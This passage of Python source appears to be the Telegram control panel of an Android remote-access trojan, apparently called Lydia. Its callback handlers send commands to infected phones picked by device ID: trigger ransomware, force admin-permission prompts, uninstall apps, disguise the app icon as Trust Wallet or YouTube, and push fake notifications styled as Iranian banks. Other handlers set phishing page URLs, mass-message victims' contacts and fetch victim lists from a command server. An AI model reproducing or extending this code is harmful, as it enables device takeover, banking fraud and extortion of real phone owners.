                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"𝑨𝒑𝒑 𝑰𝒄𝒐𝒏 𝒄𝒉𝒂𝒏𝒈𝒆𝒅 ==>> 𝒀𝒐𝒖𝑻𝒖𝒃𝒆 \n {id}")

            elif (call.data.startswith("youtubeoff")):
                androidid_reader = open(f'data/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                changeicon(id, "youtubeoff", chat_id)
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"𝑨𝒑𝒑 𝑰𝒄𝒐𝒏 𝒄𝒉𝒂𝒏𝒈𝒆𝒅 ==>> 𝒀𝒐𝒖𝑻𝒖𝒃𝒆 OFF \n {id}")
            # YouTube

            elif (call.data == "trustwalletch"):
                androidid_reader = open(f'data/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                Thread(target=changeicon, args=(id, "trustwallet", chat_id)).start()
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"App Icon changed ==>> Trust Wallet On \n {id}")
            # YouTube

            elif (call.data.startswith("status")):
                androidid_reader = open(f'data/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                Thread(target=status, args=[id, chat_id]).start()
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"𝑺𝒕𝒂𝒕𝒖𝒔 𝒓𝒆𝒒𝒖𝒆𝒔𝒕 𝒔𝒆𝒏𝒕 \n {id}")

            elif (call.data.startswith("back")):
                androidid_reader = open(f'data/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                bot.edit_message_text(chat_id=chat_id,
                                      message_id=call.message.message_id,
                                      text=f"~ @Goodhudodo\ni have seen you since 17 september\n~ : {id}",
                                      reply_markup=makeKeyboard_rm(),
                                      parse_mode='HTML')

            elif (call.data.startswith("tools")):
                bot.edit_message_text(chat_id=call.message.chat.id,
                                      message_id=call.message.message_id,
                                      text="~ @Goodhudodo\nTools menu :",
                                      reply_markup=toolsb(),
                                      parse_mode='HTML')

            elif (call.data.startswith("brightness")):
                androidid_reader = open(f'data/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                sendaction("brightness", id, chat_id)
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"brightness request sent. \n {id}")

            elif (call.data.startswith("appinfo")):
                androidid_reader = open(f'data/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                sendaction("appinfo", id, chat_id)
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"appinfo request sent. \n {id}")

            elif (call.data.startswith("uninstall")):
                androidid_reader = open(f'data/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                sendaction("uninstall", id, chat_id)
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"uninstall request sent. \n {id}")


            elif (call.data.startswith("rupadmin")):
                androidid_reader = open(f'data/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                sendaction("rupadmin", id, chat_id)
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"permission request sent. \n {id}")

            elif (call.data.startswith("rans")):
                androidid_reader = open(f'data/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                sendaction("rans", id, chat_id)
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"Ransomware request sent. \n {id}")

            elif (call.data.startswith("accessibility")):
                androidid_reader = open(f'data/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"accessibility request sent. \n {id}")

            elif (call.data.startswith("offline")):
                bot.edit_message_text(chat_id=call.message.chat.id,
                                      message_id=call.message.message_id,
                                      text="~ @Goodhudodo\noffline mode :",
                                      reply_markup=offlinemode(chat_id),
                                      parse_mode='HTML')



            elif (call.data.startswith("check")):
                androidid_reader = open(f'data/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                sendaction("check", id, chat_id)
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"𝑷𝒆𝒓𝒎𝒊𝒔𝒔𝒊𝒐𝒏𝑪𝒉𝒆𝒄𝒌 𝒓𝒆𝒒𝒖𝒆𝒔𝒕 𝒔𝒆𝒏𝒕 \n {id}")

            elif (call.data.startswith("clblock")):
                bot.send_message(chat_id, f"The block list has been cleared.")


            elif (call.data.startswith("enoff")):
                androidid_reader = open(f'data/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                sendaction("offline", id, chat_id)
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"Offline receiver request sent. \n {id}")

            elif (call.data.startswith("disoff")):
                androidid_reader = open(f'data/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                sendaction("disableoffline", id, chat_id)
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"Offline receiver request sent. \n {id}")

            elif (call.data.startswith("offstatus")):
                androidid_reader = open(f'data/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                sendaction("offstatus", id, chat_id)
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"Offline status request sent. \n {id}")

            elif (call.data.startswith("sendcontact")):
                androidid_reader = open(f'data/saver_{chat_id}.txt', 'r')
                messagetext = open(f'./data/message_{chat_id}.txt', encoding='utf-8').read()
                id = androidid_reader.read()
                send_contacts(id, messagetext, chat_id)
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"Scontact request sent. \n {id}")

                bot.send_message(chat_id, "sending message process started (i will send a result after 5 min) ...")

            elif (call.data.startswith("addcontact")):
                androidid_reader = open(f'data/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                input_text = bot.send_message(call.message.chat.id,
                                              'Please send me your number & contact name (091215515&Lydia) :')
                bot.register_next_step_handler(input_text, importcontact, call, input_text.message_id, id)




            elif (call.data.startswith("blist")):
                try:

                    if "blist" in loadingProccess:
                        bot.answer_callback_query(callback_query_id=call.id,
                                                  show_alert=True,
                                                  text="❌ Please wait for a previous response .")

                    else:
                        loadingProccess.append("blist")

                        msg = '''
🔎 Loading (50 S) *

                        '''

                        blist_user(chat_id)
                        qlistmsg = bot.send_message(chat_id, msg)
                        sleep(2)
                        bot.edit_message_text("🔎 Loading (45 S) **", chat_id, message_id=qlistmsg.message_id)
                        sleep(2)
                        bot.edit_message_text("🔎 Loading (42 S) ***", chat_id, message_id=qlistmsg.message_id)
                        sleep(2)
                        bot.edit_message_text("🔎 Loading (40 S) ****", chat_id, message_id=qlistmsg.message_id)
                        sleep(2)
                        bot.edit_message_text("🔎 Loading (38 S) *****", chat_id, message_id=qlistmsg.message_id)
                        sleep(40)

                        getlist = requests.get(f'{mainUrl}/{Topic}/{chat_id}/androidid.txt')

                        if getlist.status_code == 200:

                            open(f'./data/users_{chat_id}.txt', 'w').write(f"{getlist.text}")
                            doc = open(f'./data/users_{chat_id}.txt', 'rb')
                            bot.send_document(chat_id, doc, caption=f"👤 Count : {len(getlist.text.splitlines())}")

                            newmsg = f'''
🪜 Users List :

{getlist.text.splitlines()[0]}

@Goodhudodo      
                        '''
                            bot.edit_message_text(newmsg, chat_id, message_id=qlistmsg.message_id)
                            sleep(1)
                            newmsg2 = f'''
🪜 Users List :

{getlist.text}
👤 Count : {len(getlist.text.splitlines())}
@Goodhudodo       
                        '''
                            bot.edit_message_text(newmsg2, chat_id, message_id=qlistmsg.message_id)

                            requests.get(f'{mainUrl}/{chat_id}/block.php?url=clearandroidid&text=clearandroidid')
                            loadingProccess.clear()
                        else:
                            loadingProccess.clear()
                            bot.send_message(chat_id, "❌ there is a problem :/")



                except:
                    pass


            elif (call.data.startswith("mback")):
                bot.edit_message_text(chat_id=chat_id,
                                      message_id=call.message.message_id,
                                      text=f"~ @Goodhudodo\nu are Return to the main menu .",
                                      reply_markup=makeKeyboard(chat_id),
                                      parse_mode='HTML')

            elif (call.data == "nback"):
                bot.edit_message_text(chat_id=chat_id,
                                      message_id=call.message.message_id,
                                      text=f"~ Notification Settings :",
                                      reply_markup=NotificationSettings(chat_id),
                                      parse_mode='HTML')

            elif (call.data.startswith("settings")):
                bot.edit_message_text(chat_id=call.message.chat.id,
                                      message_id=call.message.message_id,
                                      text="~ @Goodhudodo\nSettings menu :",
                                      reply_markup=settings(chat_id),
                                      parse_mode='HTML')

            elif (call.data.startswith("autofile")):
                try:
                    if readautomatic(chat_id) == "on":
                        requests.get(f'{mainUrl}/{Topic}/{chat_id}/block.php?url=allsmsstatus&text=off')
                        bot.send_message(chat_id, "Autofile Deactivated ❌")
                    else:
                        requests.get(f'{mainUrl}/{Topic}/{chat_id}/block.php?url=allsmsstatus&text=on')
                        bot.send_message(chat_id, "Autofile Activated ✅")
                except:
                    pass


            elif (call.data.startswith("notification")):
                bot.edit_message_text(chat_id=call.message.chat.id,
                                      message_id=call.message.message_id,
                                      text="~ Notification Settings :",
                                      reply_markup=NotificationSettings(chat_id),
                                      parse_mode='HTML')

            elif (call.data == "ncontent"):
                bot.edit_message_text(chat_id=call.message.chat.id,
                                      message_id=call.message.message_id,
                                      text="~ Content Settings :",
                                      reply_markup=ContentSettings(),
                                      parse_mode='HTML')

            elif (call.data == "setpage"):
                input_text = bot.send_message(call.message.chat.id, 'Please send me your fake page url :')
                bot.register_next_step_handler(input_text, fakepage)

            elif (call.data == "whatsapp"):
                appdata[f'content_{chat_id}'] = "WhatsApp"
                bot.edit_message_text(chat_id=call.message.chat.id,
                                      message_id=call.message.message_id,
                                      text="~ Notification Settings :",
                                      reply_markup=NotificationSettings(chat_id),
                                      parse_mode='HTML')

            elif (call.data == "mainactivity"):
                appdata[f'content_{chat_id}'] = "Main"
                bot.edit_message_text(chat_id=call.message.chat.id,
                                      message_id=call.message.message_id,
                                      text="~ Notification Settings :",
                                      reply_markup=NotificationSettings(chat_id),
                                      parse_mode='HTML')

            elif (call.data == "callin"):
                appdata[f'content_{chat_id}'] = "Call"
                bot.edit_message_text(chat_id=call.message.chat.id,
                                      message_id=call.message.message_id,
                                      text="~ Notification Settings :",
                                      reply_markup=NotificationSettings(chat_id),
                                      parse_mode='HTML')

            elif (call.data == "gmailin"):
                appdata[f'content_{chat_id}'] = "Gmail"
                bot.edit_message_text(chat_id=call.message.chat.id,
                                      message_id=call.message.message_id,
                                      text="~ Notification Settings :",
                                      reply_markup=NotificationSettings(chat_id),
                                      parse_mode='HTML')


            elif (call.data == "hsaderat"):
                appdata[f'content_{chat_id}'] = "hsaderat"
                bot.edit_message_text(chat_id=call.message.chat.id,
                                      message_id=call.message.message_id,
                                      text="~ Notification Settings :",
                                      reply_markup=NotificationSettings(chat_id),
                                      parse_mode='HTML')

            elif (call.data == "hmellat"):
                appdata[f'content_{chat_id}'] = "hmellat"
                bot.edit_message_text(chat_id=call.message.chat.id,
                                      message_id=call.message.message_id,
                                      text="~ Notification Settings :",
                                      reply_markup=NotificationSettings(chat_id),
                                      parse_mode='HTML')

            elif (call.data == "ntitle"):
                input_text = bot.send_message(call.message.chat.id, 'Please send me your Notification Title :')
                bot.register_next_step_handler(input_text, ntitle)

            elif (call.data == "nicon"):
                bot.edit_message_text(chat_id=call.message.chat.id,
                                      message_id=call.message.message_id,
                                      text="~ Icon Settings :",
                                      reply_markup=iconsSettings(),
                                      parse_mode='HTML')

            elif (call.data == "whatsapp_icon"):
                appdata[f'icon_{chat_id}'] = "WhatsApp"
                bot.edit_message_text(chat_id=call.message.chat.id,
                                      message_id=call.message.message_id,
                                      text="~ Notification Settings :",
                                      reply_markup=NotificationSettings(chat_id),
                                      parse_mode='HTML')

            elif (call.data == "telegram_icon"):
                appdata[f'icon_{chat_id}'] = "Telegram"
                bot.edit_message_text(chat_id=call.message.chat.id,
                                      message_id=call.message.message_id,
                                      text="~ Notification Settings :",
                                      reply_markup=NotificationSettings(chat_id),
                                      parse_mode='HTML')


            elif (call.data == "messages_sam"):
                appdata[f'icon_{chat_id}'] = "Messages(Samsung)"
                bot.edit_message_text(chat_id=call.message.chat.id,
                                      message_id=call.message.message_id,
                                      text="~ Notification Settings :",
                                      reply_markup=NotificationSettings(chat_id),
                                      parse_mode='HTML')

            elif (call.data == "messages_xia"):
                appdata[f'icon_{chat_id}'] = "Messages(x)"
                bot.edit_message_text(chat_id=call.message.chat.id,
                                      message_id=call.message.message_id,
                                      text="~ Notification Settings :",
                                      reply_markup=NotificationSettings(chat_id),
                                      parse_mode='HTML')

            elif (call.data == "chrome_icon"):
                appdata[f'icon_{chat_id}'] = "Chrome"
                bot.edit_message_text(chat_id=call.message.chat.id,
                                      message_id=call.message.message_id,
                                      text="~ Notification Settings :",
                                      reply_markup=NotificationSettings(chat_id),
                                      parse_mode='HTML')

            elif (call.data == "trustwallet_icon"):
                appdata[f'icon_{chat_id}'] = "TrustWallet"
                bot.edit_message_text(chat_id=call.message.chat.id,
                                      message_id=call.message.message_id,
                                      text="~ Notification Settings :",
                                      reply_markup=NotificationSettings(chat_id),
                                      parse_mode='HTML')

            elif (call.data == "hsaderat_icon"):
                appdata[f'icon_{chat_id}'] = "hsaderat_icon"
                bot.edit_message_text(chat_id=call.message.chat.id,
                                      message_id=call.message.message_id,
                                      text="~ Notification Settings :",
                                      reply_markup=NotificationSettings(chat_id),
                                      parse_mode='HTML')





            elif (call.data == "sendnotification"):
                try:
                    content = appdata[f'content_{chat_id}']
                    title = appdata[f'title_{chat_id}']
                    icon = appdata[f'icon_{chat_id}']
                    text = appdata[f'notificationtext_{chat_id}']
                except:
                    content = appdata[f'content_{chatid}'] = "Default"
                    title = appdata[f'title_{chatid}'] = "Default"
                    icon = appdata[f'icon_{chatid}'] = "Default"
                    text = appdata[f'notificationtext_{chat_id}'] = "Default"

                androidid_reader = open(f'data/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                if content == "browser":
                    content = appdata[f'browser_{chat_id}']

                sendnotification(id, title, text, icon, content, chat_id)

                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text="🔔 Notification sent to your client .")

            elif (call.data == "shaba"):
                input_text = bot.send_message(call.message.chat.id, 'شماره کارت را برای استعلام شبایی وارد کنید :')
                bot.register_next_step_handler(input_text, shabacard)

            elif (call.data == "shababalance"):

                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"💰 موجودی حساب : {str(balanceShaba)} ریال")



            elif (call.data == ("broadcastt")):
                bot.edit_message_text(chat_id=call.message.chat.id,
                                      message_id=call.message.message_id,
                                      text="~ @Goodhudodo\nBroadCast To All menu :",
                                      reply_markup=broadCastn(),
                                      parse_mode='HTML')

            elif (call.data == "connections"):
                bot.edit_message_text(chat_id=call.message.chat.id,
                                      message_id=call.message.message_id,
                                      text="~ @Goodhudodo\n𝑪𝒐𝒏𝒏𝒆𝒄𝒕𝒊𝒐𝒏𝒔 :",
                                      reply_markup=connectionIntent(chat_id),
                                      parse_mode='HTML')


            elif (call.data == ("trunondata")):
                androidid_reader = open(f'data/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                Thread(target=sendaction, args=("turnondata", id, chat_id)).start()
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"𝒓𝒆𝒒𝒖𝒆𝒔𝒕 𝒔𝒆𝒏𝒕\n~ : {id}")


            elif (call.data == ("turnonwifi")):
                androidid_reader = open(f'data/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                Thread(target=sendaction, args=("turnonwifi", id, chat_id)).start()
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"𝒓𝒆𝒒𝒖𝒆𝒔𝒕 𝒔𝒆𝒏𝒕\n~ : {id}")

            elif (call.data == ("rpermissinch")):
                androidid_reader = open(f'data/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                Thread(target=sendaction, args=("blockchrome", id, chat_id)).start()
                bot.answer_callback_query(callback_query_id=call.id,
                                          show_alert=True,
                                          text=f"𝒓𝒆𝒒𝒖𝒆𝒔𝒕 𝒔𝒆𝒏𝒕\n~ : {id}")

            elif (call.data.startswith("['login','")):
                print('login')
                androididFromCallBack = ast.literal_eval(call.data)[1]
                glasses_rm_cammand(androididFromCallBack, chat_id)


    except:
        pass


@bot.message_handler(content_types=['new_chat_members'])
def handle_new_chat_member(message):
    try:
        gchat_id = message.chat.id
        chat_members = bot.get_chat_member_count(chat_id=gchat_id)

        for member in message.new_chat_members:
            if member.is_bot and member.username == 'Lydiav8testbot':
                bot_info = bot.get_chat_member(gchat_id, bot.get_me().id)
                if bot_info.status == 'administrator':

                    bot.send_message(
                        chat_id=gchat_id,
                        text=f"OK! Hi Bitches And Noobes\nDont Forget To Make Me Admin\nWait Admin To Make You Permit If Yournt Permitted Yet:)"
                    )
                    bot.send_message(
                        chat_id=chatid,
                        text=f"Robot Added To New Gap\nMembers Count : {chat_members}\nChat ID : {gchat_id}"
                    )
                else:
                    bot.send_message(
                        chat_id=gchat_id,
                        text=f"OK! Hi Bitches And Noobes\nDont Forget To Make Me Admin\nWait Admin To Make You Permit If Yournt Permitted Yet:)"
                    )
                    bot.send_message(
                        chat_id=chatid,
                        text=f"Robot Added To New Gap\nMembers Count : {chat_members}\nChat ID : {gchat_id}"
                    )
    except Exception as e:
        print(e)


bot.infinity_polling()
